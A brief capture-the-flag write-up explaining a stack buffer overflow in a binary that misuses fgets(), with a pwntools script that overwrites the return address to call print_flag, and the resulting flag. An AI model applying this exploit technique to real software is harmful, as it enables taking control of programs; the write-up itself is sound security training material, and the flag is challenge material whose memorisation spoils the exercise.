# 🔑 Write-Up

It's the same as the previous exercise, it uses `fgets()` instead of gets but the provided character limit is incorrect (it should be 32).

```python
from pwn import *

context.binary = "./hi"

p = process()
p.sendline(b"A" * 32 + b"a" * 8 + p64(context.binary.functions["print_flag"].address))
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
```
### 🚩 Flag

```plain
ccit{hi_i_am_a_flag}
```